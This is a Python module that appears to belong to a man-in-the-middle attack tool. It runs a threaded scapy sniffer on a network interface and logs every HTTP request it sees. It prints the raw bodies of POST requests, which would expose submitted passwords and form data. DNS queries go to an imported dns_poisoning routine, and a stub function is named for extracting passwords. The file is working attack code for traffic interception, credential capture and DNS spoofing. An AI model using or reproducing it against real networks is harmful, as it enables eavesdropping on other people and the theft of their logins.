import pyshark
import threading

from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNSRR, DNS, IP, UDP

from dns_poisoning import process_dns_packet
from utils import thread_with_trace

from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


def return_password_from_packet():
    pass


def process_http_packet(local_packet, printing_queue):
    url = local_packet[HTTPRequest].Host.decode() + local_packet[HTTPRequest].Path.decode()
    ip = local_packet[IP].src
    method = local_packet[HTTPRequest].Method.decode()
    printing_queue.put(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
    if local_packet.haslayer(Raw) and method == "POST":
        printing_queue.put(f"\n{RED}[*] Some useful Raw data: {local_packet[Raw].load}{RESET}")


def packet_handler(packet_to_process, target, printing_queue):
    # print(packet_to_process)
    if packet_to_process.haslayer(HTTPRequest):
        process_http_packet(packet_to_process, printing_queue)

    if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
        process_dns_packet(packet_to_process, target)


def sniffer_loop_scapy(interface_to_capture_packets, target, printing_queue, verbosity, cancel_token):
    printing_queue.put(f"{GREEN}[+] Starting sniffer{RESET}")
    while not cancel_token.is_set():
        sniff(iface=interface_to_capture_packets,
              prn=lambda packet_to_process: packet_handler(packet_to_process, target, printing_queue), store=0, count=1)
    # sniff(prn=process_packet, filter="port 80", store=False)


def start_sniffer_thread(interface_to_capture_packets, target, printing_queue, verbosity=0):
    cancel_token = threading.Event()
    sniffer_thread = threading.Thread(target=sniffer_loop_scapy,
                                      args=(
                                      interface_to_capture_packets, target, printing_queue, verbosity, cancel_token))
    sniffer_thread.start()
    return cancel_token

# if __name__ == "__main__":
# sniffer_loop_scapy("wlan0", 1)
# for testing purposes
# sniffer_loop("wlan0",1)
# start_sniffer_thread("wlan0",1)
